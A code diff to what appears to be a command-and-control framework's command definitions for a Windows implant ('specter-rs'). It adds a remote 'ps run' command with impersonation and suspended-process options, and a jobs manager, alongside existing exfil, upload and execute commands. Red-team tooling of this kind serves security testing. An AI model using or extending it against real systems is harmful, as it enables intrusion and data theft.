@@ -40,8 +40,19 @@ function RegisterCommands(listenerType)
     let _cmd_ps_list = ax.create_command("list", "List of processes", "ps list", "Task: show process list");
     let _cmd_ps_kill = ax.create_command("kill", "Kill a process", "ps kill 1234", "Task: kill process");
     _cmd_ps_kill.addArgInt("pid", true);
+    let _cmd_ps_run = ax.create_command("run", "Run a program", "ps run -o cmd.exe /c whoami", "Task: run program");
+    _cmd_ps_run.addArgBool("-o", "Output to console");
+    _cmd_ps_run.addArgBool("-s", "Suspend process");
+    _cmd_ps_run.addArgBool("-i", "Use impersonation");
+    _cmd_ps_run.addArgString("args", true);
     let cmd_ps = ax.create_command("ps", "Process manager");
-    cmd_ps.addSubCommands([_cmd_ps_list, _cmd_ps_kill]);
+    cmd_ps.addSubCommands([_cmd_ps_list, _cmd_ps_kill, _cmd_ps_run]);
+
+    let _cmd_jobs_list = ax.create_command("list", "List of jobs", "jobs list", "Task: show jobs");
+    let _cmd_jobs_kill = ax.create_command("kill", "Kill a job", "jobs kill 1a2b3c4d", "Task: kill job");
+    _cmd_jobs_kill.addArgString("task_id", true);
+    let cmd_jobs = ax.create_command("jobs", "Long-running tasks manager");
+    cmd_jobs.addSubCommands([_cmd_jobs_list, _cmd_jobs_kill]);
 
     let cmd_download = ax.create_command("download", "Download a file", "download C:\\Temp\\file.txt", "Task: download file");
     cmd_download.addArgString("file", true);
@@ -76,7 +87,7 @@ function RegisterCommands(listenerType)
     cmd_terminate.addSubCommands([_cmd_terminate_thread, _cmd_terminate_process]);
 
     if(listenerType == "BeaconHTTP") {
-        let commands_http = ax.create_commands_group("specter-rs", [cmd_pwd, cmd_cd, cmd_ls, cmd_cat, cmd_mkdir, cmd_rm, cmd_cp, cmd_mv, cmd_getuid, cmd_disks, cmd_ps, cmd_download, cmd_upload, cmd_exfil, cmd_execute, cmd_sleep, cmd_terminate]);
+        let commands_http = ax.create_commands_group("specter-rs", [cmd_pwd, cmd_cd, cmd_ls, cmd_cat, cmd_mkdir, cmd_rm, cmd_cp, cmd_mv, cmd_getuid, cmd_disks, cmd_ps, cmd_jobs, cmd_download, cmd_upload, cmd_exfil, cmd_execute, cmd_sleep, cmd_terminate]);
         return { commands_windows: commands_http }
     }
 
